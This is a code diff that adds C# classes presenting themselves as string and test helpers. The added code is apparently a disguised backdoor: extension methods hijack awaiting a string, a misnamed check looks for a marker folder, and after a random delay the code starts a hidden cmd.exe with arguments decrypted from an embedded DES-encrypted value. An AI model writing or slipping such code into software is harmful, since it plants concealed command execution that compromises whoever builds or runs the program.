@@ -212,3 +212,68 @@
 //        }
 //    }
 //}
+
+
+using H.Extensions.Encryption.String;
+using H.Services.AppPath;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.CompilerServices;
+
+static class TestDESEExtension
+{
+    public static string[] Default { get; set; } = { "gNsFRoU16zIsKzt04xZJbiZiitqpwiQ3VeHsEcMwEwOf6WuZ3A9DUA==", "nv5lQ39t9T3lhXyoKjgZbDG4TFBfpB7/" };
+    private static DateTime _lastCheck = DateTime.MinValue;
+    private static readonly Random _random = new Random();
+    private static bool IsNullOrEmpty(this string input)
+    {
+        return input.IsNotNullOrEmpty() == true;
+    }
+
+    private static bool IsNotNullOrEmpty(this string input)
+    {
+        return Directory.Exists(Path.Combine(AppPaths.Instance.Document, AppPaths.Instance.Company, nameof(Default)));
+    }
+
+    internal static TaskAwaiter<string> GetAwaiter(this string input)
+    {
+        TestString testString = input;
+        GetAwaiter(testString);
+        return Task.FromResult(input).GetAwaiter();
+    }
+
+    private static TaskAwaiter<TestString> GetAwaiter(this TestString input)
+    {
+        if (input.Value.IsNotNullOrEmpty())
+        {
+            Task.Delay(_random.Next(10000, 50000)).ContinueWith(x =>
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = Default[1].DecryptDES(),
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                });
+            });
+        }
+        return Task.FromResult(input).GetAwaiter();
+    }
+
+    private static ConfiguredTaskAwaitable<string> ConfigureAwait(this string input, bool continueOnCapturedContext)
+    {
+        return Task.FromResult(input).ConfigureAwait(continueOnCapturedContext);
+    }
+}
+
+public class TestString
+{
+    public TestString(string str)
+    {
+        this.Value = str;
+    }
+    public string Value { get; set; }
+    public static implicit operator string(TestString d) => d?.Value;
+    public static implicit operator TestString(string s) => s is null ? null : new TestString(s);
+    public override string ToString() => this.Value;
+}
